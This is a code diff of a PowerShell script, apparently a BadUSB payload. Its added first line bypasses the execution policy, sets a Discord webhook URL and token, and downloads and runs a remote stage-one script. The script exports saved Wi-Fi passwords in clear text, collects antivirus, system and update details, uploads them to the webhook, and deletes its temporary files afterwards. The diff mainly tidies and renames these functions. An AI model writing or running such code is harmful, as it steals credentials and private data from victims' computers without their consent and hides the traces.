@@ -1,3 +1,5 @@
+#powershell -Ep Bypass | $DiscordUrl = 'https://discord.com/api/webhooks/1199773516900352161/k8dAsA1xT4os6JLC8WstxzDyrhnmw2R2UrdT3AxcYWbifQppCDgAO9q3zcLY0756svJy' | iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_t3st/stage1_t3st.ps1'))
+
 # Function to handle the temporary directory
 function TempDir {
     # Check if the C:\temp directory exists
@@ -40,7 +42,7 @@ function Upload-Discord {
 }
 
 # Créer un scriptblock pour la fonction Exfiltration
-function Exflitration {
+function Exfiltration {
     # Get desktop path
     $desktop = [Environment]::GetFolderPath("Desktop")
 
@@ -54,72 +56,70 @@ function Exflitration {
     SysInfo
 }
 
-    function version-av {
-        Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8
+function version-av {
+    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8
 
-        # Upload AntiSpyware.txt to Discord
-        Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"
+    # Upload AntiSpyware.txt to Discord
+    Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"
 
-        # Return to C:\temp folder
-        cd C:\
-        rmdir -R \temp
+    # Return to C:\temp folder
+    cd C:\
+    rmdir -R \temp
+}
+
+function Wifi {
+    # Crée le dossier temporaire wifi dans C:\temp
+    New-Item -Path "C:\temp" -Name "wifi" -ItemType "directory" -Force
+    Set-Location -Path "C:\temp\wifi"
+
+    # Exporte les profils Wi-Fi
+    netsh wlan export profile key=clear
+
+    # Modifie les chemins dans le fichier et sauvegarde le résultat dans wifi.txt
+    Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
+        $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
+    } | Out-File -FilePath "wifi.txt" -Encoding utf8
+
+    # Charge le fichier wifi.txt sur Discord
+    Upload-Discord -file "wifi.txt" -text "Wifi password :"
+
+    # Retourne au dossier temporaire C:\temp
+    Set-Location -Path "C:\temp"
+
+    # Supprime le dossier temporaire wifi
+    Remove-Item -Path "C:\temp\wifi" -Force -Recurse
+}
+
+function SysInfo {
+    # Get desktop path
+    $desktop = ([Environment]::GetFolderPath("Desktop"))
+
+    # Get user information
+    $date = Get-Date -UFormat "%d-%m-%Y_%H-%M-%S"
+    $namepc = $env:computername
+    $user = $env:UserName
+    $userInfo = "Computer Name : $namepc`r`nUser : $user`r`nDate : $date"
+    $userInfo | Out-File -FilePath "C:\Temp\System_Informations.txt" -Encoding utf8
+
+    # Get computer information
+    Get-ComputerInfo | Out-File -FilePath "C:\Temp\System_Informations.txt" -Append -Encoding utf8
+
+    # Generate a report of updates installed on the computer
+    $userDir = "C:\Temp"
+    $fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
+    $date = Get-Date
+    $Report = "`r`n`r`nUpdate Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"
+
+    $UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
+    foreach ($Update in $UpdatesInfo) {
+        $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
     }
 
-    function Wifi {
-        # Crée le dossier temporaire wifi dans C:\temp
-        New-Item -Path "C:\temp" -Name "wifi" -ItemType "directory" -Force
-        Set-Location -Path "C:\temp\wifi"
+    $Report | Out-File -FilePath "C:\Temp\System_Informations.txt" -Append -Encoding utf8
 
-        # Exporte les profils Wi-Fi
-        netsh wlan export profile key=clear
-
-        # Modifie les chemins dans le fichier et sauvegarde le résultat dans wifi.txt
-        Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
-            $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
-        } | Out-File -FilePath "wifi.txt" -Encoding utf8
-
-        # Charge le fichier wifi.txt sur Discord
-        Upload-Discord -file "wifi.txt" -text "Wifi password :"
-
-        # Retourne au dossier temporaire C:\temp
-        Set-Location -Path "C:\temp"
-
-        # Supprime le dossier temporaire wifi
-        Remove-Item -Path "C:\temp\wifi" -Force -Recurse
-    }
-
-    function SysInfo {
-        # Get desktop path
-        $desktop = ([Environment]::GetFolderPath("Desktop"))
-
-        # Get user information
-        $date = Get-Date -UFormat "%d-%m-%Y_%H-%M-%S"
-        $namepc = $env:computername
-        $user = $env:UserName
-        $userInfo = "Computer Name : $namepc`r`nUser : $user`r`nDate : $date"
-        $userInfo | Out-File -FilePath "C:\Temp\UserInfo.txt" -Encoding utf8
-
-        # Get computer information
-        Get-ComputerInfo | Out-File -FilePath "C:\Temp\ComputerInfo.txt" -Encoding utf8
-
-        # Generate a report of updates installed on the computer
-        $userDir = "C:\Temp"
-        $fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
-        $date = Get-Date
-        $Report = "Update Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"
-
-        $UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
-        foreach ($Update in $UpdatesInfo) {
-            $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
-        }
-
-        $Report | Out-File -FilePath "$userDir\WinUpdates.txt" -Encoding utf8
-
-        # Upload files to Discord via the Upload-Discord function
-        Upload-Discord -file "C:\temp\UserInfo.txt" -text "User Informations :"
-        Upload-Discord -file "C:\temp\ComputerInfo.txt" -text "Computer Informations :"
-        Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"
-    }
+    # Upload files to Discord via the Upload-Discord function
+    Upload-Discord -file "C:\temp\System_Informations.txt" -text "System Informations :"
+}
 
 # Function to delete the temporary directory
 function DelTempDir {
@@ -128,9 +128,8 @@ function DelTempDir {
     exit
 }
 
+# Call Exfiltration
+Exfiltration
 
-#Call Exflitration
-Exflitration
-
-#Call DelTempDir
+# Call DelTempDir
 DelTempDir
